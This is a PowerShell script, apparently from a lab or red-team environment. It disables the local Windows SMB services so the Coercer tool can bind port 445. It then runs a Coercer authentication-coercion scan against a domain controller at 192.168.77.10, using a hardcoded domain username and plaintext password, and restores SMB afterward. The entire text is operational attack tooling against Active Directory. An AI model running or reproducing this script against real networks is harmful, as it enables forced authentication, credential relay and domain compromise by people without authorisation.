# Coercer scan with SMB stack disabled so coercer can bind 445
$ErrorActionPreference = "Continue"
Write-Output "=== disable SMB stack ==="
sc.exe config LanmanServer start= disabled | Out-Null
sc.exe config srv2 start= disabled | Out-Null
sc.exe config srvnet start= disabled | Out-Null
Stop-Service LanmanServer -Force -ErrorAction SilentlyContinue
sc.exe stop srv2 | Out-Null
sc.exe stop srvnet | Out-Null
Start-Sleep -Seconds 5
$c = Get-NetTCPConnection -LocalPort 445 -State Listen -ErrorAction SilentlyContinue
Write-Output "445_free=$(-not [bool]$c)"

$env:PYTHONIOENCODING = "utf-8"
$out = "C:\Tools\cadre-attack\coercer-scan.log"
& "C:\Tools\RedStrike\.venv\Scripts\coercer.exe" scan -u chief_command -p "C0mm@nd_Ch1ef!" -d cadre.local --dc-ip 192.168.77.10 -t 192.168.77.10 2>&1 | Out-File $out -Encoding UTF8 -Force
Write-Output "scan_rc=$LASTEXITCODE"

Write-Output "=== restore SMB stack ==="
sc.exe config LanmanServer start= auto | Out-Null
sc.exe config srv2 start= demand | Out-Null
sc.exe config srvnet start= demand | Out-Null
sc.exe start srvnet | Out-Null
sc.exe start srv2 | Out-Null
Start-Sleep -Seconds 2
Start-Service LanmanServer -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2
Write-Output "lanman=$( (Get-Service LanmanServer -ErrorAction SilentlyContinue).Status )"

Write-Output "=== scan log ==="
Get-Content $out
